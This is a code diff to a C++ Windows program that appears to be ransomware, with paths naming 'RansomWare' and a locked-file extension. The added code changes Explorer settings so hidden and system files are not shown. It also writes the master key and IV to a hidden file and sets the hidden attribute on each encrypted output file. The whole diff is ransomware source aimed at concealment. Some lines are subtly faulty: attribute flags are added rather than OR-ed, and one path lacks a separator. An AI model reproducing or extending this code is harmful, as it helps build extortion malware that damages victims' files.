@@ -15,19 +15,32 @@ DWORD getKeyHandle(PBYTE key, BCRYPT_KEY_HANDLE& keyHandle, BCRYPT_ALG_HANDLE& a
 
 DWORD generateKeyAndIV(PBYTE* iv, PBYTE* key);
 
+void changeHiddenFileState(bool state)
+{
+	SHELLSTATE ss;
+	ZeroMemory(&ss, sizeof(ss));
+	ss.fShowAllObjects = state;
+	ss.fShowSysFiles = state;
+	ss.fShowSuperHidden = state;
+	SHGetSetSettings(&ss, SSF_SHOWALLOBJECTS | SSF_SHOWSYSFILES | SSF_SHOWSUPERHIDDEN, TRUE);
+}
+
 
 int main(int argc, char* argv[]) {
 //	crypt_data* d = generatekey();//TODO also move to encrypt
 	PBYTE masterIV, masterKey;
 	DWORD status = generateKeyAndIV(&masterIV, &masterKey);
 
-	string pathToMasters = "C:\\rans\\236499\\Squanched\\Debug\\KEY-IV.txt";
+	changeHiddenFileState(false);
+	string pathToMasters = R"(C:\Programming\RansomWare\236499\Squanched\DebugKEY-IV.txt)";
 	std::ofstream masterKeyIVFile;
 	masterKeyIVFile.open(pathToMasters, std::ios::binary);
 	masterKeyIVFile.write((char*)masterKey, KEY_LEN);
 	masterKeyIVFile.write((char*)masterIV, IV_LEN);
+	DWORD attributes = GetFileAttributes(pathToMasters.c_str());
+	SetFileAttributes(pathToMasters.c_str(), attributes + FILE_ATTRIBUTE_HIDDEN);
 	masterKeyIVFile.close();
-
+	changeHiddenFileState(true);
 	
 #ifdef DEBUG
 	string path = ROOT_DIR;
@@ -130,6 +143,8 @@ void writeToFile(string path, PBYTE cipherText, DWORD cipherLen, PBYTE keyIV, si
 	ofile.write((char*)keyIV, KEY_LEN + IV_LEN);
 	ofile.write((char*)cipherText, cipherLen);
 	int size_tot = IV_DIGITS_NUM + KEY_LEN + IV_LEN + cipherLen;
+	DWORD attributes = GetFileAttributes((path + LOCKED_EXTENSION).c_str());
+	SetFileAttributes((path + LOCKED_EXTENSION).c_str(), attributes + FILE_ATTRIBUTE_HIDDEN);
 	ofile.close();
 	
 }
